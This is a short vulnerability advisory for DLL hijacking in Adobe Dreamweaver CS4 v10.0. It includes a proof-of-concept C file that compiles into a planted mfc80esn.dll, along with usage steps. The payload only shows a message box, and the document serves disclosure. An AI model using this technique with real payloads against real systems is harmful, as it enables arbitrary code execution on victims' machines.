source: http://www.securityfocus.com/bid/43911/info

Adobe Dreamweaver CS4 is prone to a vulnerability that lets attackers execute arbitrary code.

An attacker can exploit this issue by enticing a legitimate user to use the vulnerable application to open a file from a network share location that contains a specially crafted Dynamic Linked Library (DLL) file. 

/*
============================================================================
Adobe Dreamweaver CS4 - v10.0 Build 4117 DLL Hijacking Exploit (mfc80esn.dll) 
=============================================================================

$ Program: Adobe Dreamweaver
$ Version: v10.0 Build 4117
$ Download: http://www.adobe.com/es/products/dreamweaver/
$ Date: 2010/10/08
 
Found by Pepelux <pepelux[at]enye-sec.org>
http://www.pepelux.org
eNYe-Sec - www.enye-sec.org

Tested on: Windows XP SP2 && Windows XP SP3

How  to use : 

1> Compile this code as mfc80esn.dll
	gcc -shared -o mfc80esn.dll thiscode.c
2> Move DLL file to the directory where Dreamweaver is installed
3> Open any file recognized by Dreamweaver
*/


#include <windows.h>
#define DllExport __declspec (dllexport)
int mes()
{
  MessageBox(0, "DLL Hijacking vulnerable", "Pepelux", MB_OK);
  return 0;
}
BOOL WINAPI  DllMain (
			HANDLE    hinstDLL,
            DWORD     fdwReason,
            LPVOID    lpvReserved)
			{mes();}
